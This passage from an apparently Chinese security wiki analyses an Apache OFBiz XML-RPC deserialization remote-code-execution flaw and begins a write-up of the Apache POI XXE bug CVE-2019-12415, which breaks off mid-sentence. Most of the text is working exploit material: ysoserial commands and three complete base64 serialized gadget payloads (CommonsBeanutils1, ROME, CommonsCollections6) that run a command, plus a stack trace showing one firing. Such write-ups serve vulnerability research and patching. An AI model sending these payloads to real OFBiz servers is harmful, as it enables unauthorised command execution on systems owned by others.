所以此处传入一个已注册的service 回到org.apache.xmlrpc.server.XmlRpcServerWorker#execute()，当成功查询到service后通过handler.execute(pRequest)进行调用，注意此处还会检查一次ModelService的export属性，因此通过遍历serviceMap找到一个export为true的方法，如ping ApacheOfbiz远程命令执行漏洞/media/rId31.png) 继续构造请求（下面会解释为什么需要struct块） ping foo aa 响应 messagePONG 说明成功调用ping方法 反序列化点在Ofbiz自带的第三方库xmlrpc-common-3.1.3.jar中的org.apache.xmlrpc.parser.SerializableParser类能明显地看到对数据的还原操作，如果gadget到达此处能直接被反序列化而不会被过滤。 ApacheOfbiz远程命令执行漏洞/media/rId32.png) 解析xml回到org.apache.ofbiz.webapp.control.RequestHandler#runEvent()方法，在其随后调用的链中，注意到getRequest()方法 org.apache.ofbiz.webapp.control.RequestHandler.runEvent() org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke() org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute() org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest() 在getRequest()中，传入的xml数据由第三方库xmlrpc-common.jar来进行解析（注意到此处做了XXE防护） ApacheOfbiz远程命令执行漏洞/media/rId33.png) 该类的初始化由父类org.apache.xmlrpc.parser.RecursiveTypeParserImpl完成，顾名思义就是递归解析，其他的便是常规的xml元素解析操作，包括startElement()、endElement()等。我们知道在解析器解析xml数据的过程中，会触发到scanDocument()操作对元素进行逐一\"扫描\"，其中就会进行startElement()、endElement()的调用，这个过程如果处理不当就会引入问题。 ApacheOfbiz远程命令执行漏洞/media/rId34.png) 注意到在endElement()方法中对于value标签的处理，同样由父类完成，跟入org.apache.xmlrpc.parser.RecursiveTypeParserImpl#endValueTag() ApacheOfbiz远程命令执行漏洞/media/rId35.png) 在endValueTag()调用了getResult()方法，而这个方法就是上面提到的反序列化目标方法，那么接下来就是构造xml数据发送给Ofbiz，如果value的标签中存放的值为序列化数据，那么会由SerializableParser类进行反序列化进而触发漏洞，调用链是这个样子的 org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest() org.apache.xerces.parsers.AbstractSAXParser.parse() org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument() org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement() org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement() org.apache.xmlrpc.parser.MapParser.endElement() org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag() org.apache.xmlrpc.parser.SerializableParser.getResult() poc构造 接下来的问题就是如何构造出特定的xml数据 以上面的ping方法为例，假设post如下数据 ping test Ofbiz成功解析到endValueTag()方法，但是由于typeParser属性为空，因此不会进入getResult()方法 ApacheOfbiz远程命令执行漏洞/media/rId36.png) 那么typeParser属性是在哪里赋值的呢？ 回到org.apache.xmlrpc.parser.XmlRpcRequestParser#startElement()，在解析器解析xml标签时，对4类标签（methodCall、params、param、value）有分别的处理，这个处理过程是随着每次遍历标签进行的，当扫描完4个必须提供的标签后，会调用父类的startElement()进行处理，而typeParser就是在父类中完成赋值的，随后便通过不同的解析器进入不同的解析流程，还是会调用对应解析器的startElement，这个过程是递归的 ApacheOfbiz远程命令执行漏洞/media/rId37.png) ApacheOfbiz远程命令执行漏洞/media/rId38.png) 分析扫描标签的递增过程，发现此处除了4个标签外，还需在标签中含有额外的标签，才会进入default分支进而对typeParser赋值，此时struct就是一个很好的选择，它能把数据作为一个结构体传入。 接着思考如何传入序列化数据，也即如何控制后端通过SerializableParser解析数据 还是关注typeParser的赋值过程，这个属性就是最终将要处理不同类型数据的解析器，在org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement()中，注意到factory.getParser()操作，将由org.apache.xmlrpc.common.TypeFactoryImpl类获得不同数据类型的解析类，在其中就有获取SerializableParser的过程 ApacheOfbiz远程命令执行漏洞/media/rId39.png) 因此只要传入标签便会由SerializableParser进行解析。 此时还有个前提条件，那就是标签属性必须带有XmlRpcWriter.EXTENSIONS_URI才会进入后续的判断流程，因此post的数据是这样子的： ping serialized_data 最后一步，数据的格式 在获取到SerializableParser解析器后，startElement过程由父类org.apache.xmlrpc.parser.ByteArrayParser#startElement()完成，在其中能看到base64的解码操作，所以最终的序列化数据是需要通过base64传输的 ApacheOfbiz远程命令执行漏洞/media/rId40.png) 漏洞复现 这里提供三种利用链 Since OFBiz uses vulnerable versions of the Apache Commons BeanUtils Library and the Apache ROME Library, an attacker can craft malicious payloads in an XML format using the ysoserial gadget tool. ApacheOfbiz远程命令执行漏洞/media/rId42.png) 查看ysoserial的说明： CommonsBeanutils1 @frohoff commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 ROME @mbechler rome:1.0 CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1 CommonsCollections6 @matthias_kaiser commons-collections:3.1 FileUpload1 @mbechler commons-fileupload:1.3.1, commons-io:2.4 使用ysoserial生成payload，进行base64编码，然后去掉换行符： java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsBeanutils1 calc |base64 | tr -d '\\n' java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ROME calc |base64 | tr -d '\\n' java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar FileUpload1 \"write;C:/Users/Administrator/Desktop/new/test.txt;test by cqq\"|base64 |tr -d '\\n' CommonBeanutils1的payload： rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABpbK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHHlzb3NlcmlhbC9Qd25lcjcxODg2NDI0MzAwNDMBAB5MeXNvc2VyaWFsL1B3bmVyNzE4ODY0MjQzMDA0MzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA== ROME的payload： rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaYyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEABGNhbGMIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB15c29zZXJpYWwvUHduZXIyMTg2NzY5NjY0NTQ1MwEAH0x5c29zZXJpYWwvUHduZXIyMTg2NzY5NjY0NTQ1MzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB+AB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB+ACNxAH4ADXEAfgAGcQB+AAZxAH4ABng= CC6的payload: rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg= ApacheOfbiz远程命令执行漏洞/media/rId46.gif) 调用链 java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171) ~[commons-beanutils-1.9.3.jar:1.9.3] at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721) ~[?:1.8.0_141] at java.util.PriorityQueue.siftDown(PriorityQueue.java:687) ~[?:1.8.0_141] at java.util.PriorityQueue.heapify(PriorityQueue.java:736) ~[?:1.8.0_141] at java.util.PriorityQueue.readObject(PriorityQueue.java:795) ~[?:1.8.0_141] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_141] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_141] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_141] at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_141] at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1058) ~[?:1.8.0_141] at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2136) ~[?:1.8.0_141] at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2027) ~[?:1.8.0_141] at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1535) ~[?:1.8.0_141] at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422) ~[?:1.8.0_141] at org.apache.xmlrpc.parser.SerializableParser.getResult(SerializableParser.java:36) ~[xmlrpc-common-3.1.3.jar:3.1.3] at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag(RecursiveTypeParserImpl.java:78) ~[xmlrpc-common-3.1.3.jar:3.1.3] at org.apache.xmlrpc.parser.MapParser.endElement(MapParser.java:185) ~[xmlrpc-common-3.1.3.jar:3.1.3] at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement(RecursiveTypeParserImpl.java:103) ~[xmlrpc-common-3.1.3.jar:3.1.3] at org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement(XmlRpcRequestParser.java:165) ~[xmlrpc-common-3.1.3.jar:3.1.3] at org.apache.xerces.parsers.AbstractSAXParser.endElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?] at org.apache.xerces.impl.XMLNSDocumentScannerImpl.scanEndElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?] at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl$FragmentContentDispatcher.dispatch(Unknown Source) ~[xercesImpl-2.9.1.jar:?] at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source) ~[xercesImpl-2.9.1.jar:?] at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?] at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?] at org.apache.xerces.parsers.XMLParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?] at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?] at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?] at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest(XmlRpcEventHandler.java:285) ~[ofbiz.jar:?] at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute(XmlRpcEventHandler.java:229) [ofbiz.jar:?] at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke(XmlRpcEventHandler.java:145) [ofbiz.jar:?] at org.apache.ofbiz.webapp.control.RequestHandler.runEvent(RequestHandler.java:741) [ofbiz.jar:?] at org.apache.ofbiz.webapp.control.RequestHandler.doRequest(RequestHandler.java:465) [ofbiz.jar:?] at org.apache.ofbiz.webapp.control.ControlServlet.doGet(ControlServlet.java:217) [ofbiz.jar:?] at org.apache.ofbiz.webapp.control.ControlServlet.doPost(ControlServlet.java:91) [ofbiz.jar:?] 参考链接 https://xz.aliyun.com/t/8324\\#toc-9 https://blog.csdn.net/caiqiiqi/article/details/108646579 https://xz.aliyun.com/t/8184/\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:06 "},"Web安全/Apache POI/（CVE-2019-12415）Apache POI = 4.1.0 XXE漏洞/（CVE-2019-12415）Apache POI = 4.1.0 XXE漏洞.html":{"url":"Web安全/Apache POI/（CVE-2019-12415）Apache POI = 4.1.0 XXE漏洞/（CVE-2019-12415）Apache POI = 4.1.0 XXE漏洞.html","title":"（CVE-2019-12415）Apache POI = 4.1.0 XXE漏洞","keywords":"","body":"（CVE-2019-12415）Apache POI \\ 一、漏洞简介 什么是POI Apache POI是Apache软件基金会的开放源码函式库，POI提供API给Java程序对Microsoft Office格式档案读和写的功能。 关于CVE-2019-12415 这是最近的POI官方宣布出来的一个XXE漏洞，可以影响到4.1.0版本，官方已在十天前更新了4.1.1版本，最新版本修复了这个XXE漏洞。 在最高4.1.0的Apache POI中，当使用工具XSSFExportToXml转换用户提供的Microsoft Excel文档时，特制文档可允许攻击者通过XML外部实体（XXE）从本地文件系统或内部网络资源中读取文件。加工中。 根据官方介绍，防御是在使用 XSSFExportToXml类xlsx转xml时触发的。 diff了一下4.1.0和4.1.1 XSSFExportToXml类的原始代码，发现在isValid方法里多设置了一个功能。 问题就出在 XSSFExportToXml#isValid 方法里，如果 XSSFExportToXml#exportToXML方法的第三个参数为true逐步进入 isValid触发XXE。 ApachePOI 二、漏洞影响 Apache POI\\ 三、复现过程 XSSFWorkbook wb = new XSSFWorkbook(new FileInputStream(new File(\"CustomXMLMappings.xlsx\"))); for (XSSFMap map : wb.getCustomXMLMappings()) { XSSFExportToXml exporter = new XSSFExportToXml(map); // 使用 XSSFExportToXml 将 xlsx 转成 xml exporter.exportToXML(System.out, true);//第一个参数是输出流无所谓，第二个参数要为 true} 然后下载这个xlsx文件。 https://github.com/apache/poi/raw/f509d1deae86866ed531f10f2eba7db17e098473/test-data/spreadsheet/CustomXMLMappings.xlsx 把文件替换为\" 